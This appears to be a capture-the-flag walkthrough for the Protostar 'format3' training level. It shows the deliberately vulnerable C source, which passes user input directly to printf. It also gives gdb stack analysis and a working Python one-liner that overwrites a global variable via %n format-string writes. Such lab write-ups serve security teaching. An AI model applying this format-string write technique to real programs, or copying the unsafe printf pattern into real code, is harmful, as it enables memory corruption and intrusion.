## FORMAT THREE ##
This level advances from format2 and shows how to write more than 1 or 2 bytes 
of memory to the process. This also teaches you to carefully control what data 
is being written to the process memory.

This level is at /opt/protostar/bin/format3
### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

First of all, we need to find out the *target* address by using objdump
```
objdump -t /opt/protostar/bin/format3 | grep target

080496f4 g     O .bss   00000004              target
```
After that, we know that when we supply a format string into *printf* function,
it will print from esp + 4 up or starting from the stack address where the
argument list is stored. Since we have only 512 bytes in our buffer, we need to
find a way to skip the elements in between. In this case, we can use %k$ in
order to point to the argument number that we want. Furthermore, since we can't
write a big number into our buffer because it will take a long time to finish,
we should write one byte at a time and offset the address in order to get to the
next one. 
```
(gdb) b *printf
Breakpoint 2 at 0x804837c
(gdb) r
Starting program: /opt/protostar/bin/format3

Breakpoint 1, main (argc=1, argv=0xbffff874) at format3/format3.c:29
29      format3/format3.c: No such file or directory.
        in format3/format3.c
(gdb) c
Continuing.
AAAA

Breakpoint 2, __printf (format=0xbffff5b0 "AAAA\n") at printf.c:30
30      printf.c: No such file or directory.
        in printf.c
(gdb) info frame
Stack level 0, frame at 0xbffff580:
 eip = 0xb7eddf90 in __printf (printf.c:30); saved eip 0x8048465
 called by frame at 0xbffff5a0
 source language c.
 Arglist at 0xbffff578, args: format=0xbffff5b0 "AAAA\n"
 Locals at 0xbffff578, Previous frame's sp is 0xbffff580
 Saved registers:
  eip at 0xbffff57c
(gdb) p 0xbffff5b0 - 0xbffff580
$1 = 48
(gdb) x/24wx $esp
0xbffff57c:     0x08048465      0xbffff5b0      0x00000000      0xbffff5b0
0xbffff58c:     0xb7fd7ff4      0x00000000      0x00000000      0xbffff7b8
0xbffff59c:     0x0804849d      0xbffff5b0      0x00000200      0xb7fd8420
0xbffff5ac:     0xbffff5f4      0x41414141      0x0000000a      0xb7fff524
0xbffff5bc:     0x00000000      0xb7fff524      0xbffff650      0xb7fe35c9
0xbffff5cc:     0x00000007      0x00000010      0x00000001      0x00000000

(gdb) x/s 0xbffff580 + 12 * 4
0xbffff5b0:      "AAAA\n"
```
Therefore, the specified address should start 48 bytes above the argument list.

```
(python -c "print('\xf4\x96\x04\x08' + '\xf5\x96\x04\x08' + '\xf6\x96\x04\x08' 
            + '\xf7\x96\x04\x08' + '%52x%12\$n' + '%17x%13\$n' 
            + '%173x%14\$n')" ; cat) | /opt/protostar/bin/format3
����                                                   0         bffff5b0                                                                                                                                                                     b7fd7ff4
you have modified the target :)
```

### REFERENCES
https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YROI8XVfj5Y
